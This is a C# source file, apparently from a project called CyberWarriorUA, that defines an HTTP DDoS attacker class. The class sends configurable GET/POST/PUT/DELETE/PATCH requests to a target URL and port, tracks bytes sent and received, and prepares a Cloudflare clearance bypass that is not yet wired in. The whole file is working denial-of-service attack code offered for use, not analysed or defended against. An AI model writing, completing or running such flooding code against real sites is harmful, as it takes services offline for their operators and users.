﻿using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using CloudFlareUtilities;
using CyberWarriorUA.Models;

namespace CyberWarriorUA.Services
{
    public class HttpDDoSAtacker : DDoSBase
    {
        public HttpDDoSAtacker(AttackInfo attackModel) : base(attackModel)
        {
        }

        public override async Task Attack()
        {
            try
            {
                var proxy = new WebProxy()
                {

                };

                var httpClientHandler = new HttpClientHandler
                {
                    Proxy = proxy
                };

                //Check later for cloudflare bypass
                var handler = new ClearanceHandler
                {
                    MaxRetries = 2,// Optionally specify the number of retries, if clearance fails (default is 3).
                };


                var httpClient = new HttpClient();

                var request = new HttpRequestMessage();
                request.Method = GetMethod();
                request.Content = new StringContent(AttackModel.Message);
                request.RequestUri = GetUri();

                await Task.Delay(200);

                var response = await httpClient.SendAsync(request);

                var reqSize = request.Content.Headers.ContentLength;
                var resSize = response.Content.Headers.ContentLength;
                _ddosInfoManager.RaiseEvent(this, new DDoSInfo
                {
                    Received = resSize,
                    Sent = reqSize

                }, nameof(OnAttackFinished));
                httpClient.Dispose();
                response.Dispose();
            } catch (Exception ex)
            {
    
            }
        }

        private Uri GetUri()
        {
            var protocol = AttackModel.IsHttps
                               ? "https://"
                               : "http://";
            var url = new Uri($"{protocol}{AttackModel.URL}");
            var baseUrl = url.Host;

            var newUrl = $"{protocol}{baseUrl}:{AttackModel.Port}{url.PathAndQuery}";
            return new Uri(newUrl);
        }

        private HttpMethod GetMethod()
        {
            return (EHttpMethod)AttackModel.HttpMethod switch
            {
                EHttpMethod.Get => HttpMethod.Get,
                EHttpMethod.Post => HttpMethod.Post,
                EHttpMethod.Put => HttpMethod.Put,
                EHttpMethod.Delete => HttpMethod.Delete,
                EHttpMethod.Patch => new HttpMethod("PATCH"),
                _ => HttpMethod.Get
            };
        }
    }

    public class DDoSInfo
    {
        public long? Sent { get; set; }
        public long? Received { get; set; }
    }
}
